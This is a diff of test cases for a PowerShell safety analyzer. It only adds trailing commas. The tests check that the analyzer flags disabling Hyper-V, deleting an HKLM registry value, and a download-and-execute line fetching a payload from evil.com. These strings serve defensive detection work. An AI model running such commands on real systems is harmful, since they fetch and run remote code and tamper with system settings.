@@ -80,7 +80,7 @@ describe("analyzePowerShellSafety", () => {
 
   test("detects Disable-WindowsOptionalFeature", () => {
     const result = analyzePowerShellSafety(
-      "Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V"
+      "Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V",
     );
     expect(result).not.toBeNull();
     expect(result).toContain("disabling Windows features");
@@ -100,7 +100,7 @@ describe("analyzePowerShellSafety", () => {
 
   test("detects download-and-execute pattern", () => {
     const result = analyzePowerShellSafety(
-      "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+      "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
     );
     expect(result).not.toBeNull();
     expect(result).toContain("remote script");
@@ -114,7 +114,7 @@ describe("analyzePowerShellSafety", () => {
 
   test("detects Remove-ItemProperty on HKLM", () => {
     const result = analyzePowerShellSafety(
-      "Remove-ItemProperty -Path HKLM:\\SOFTWARE\\MyApp -Name MyValue"
+      "Remove-ItemProperty -Path HKLM:\\SOFTWARE\\MyApp -Name MyValue",
     );
     expect(result).not.toBeNull();
     expect(result).toContain("system registry modification");
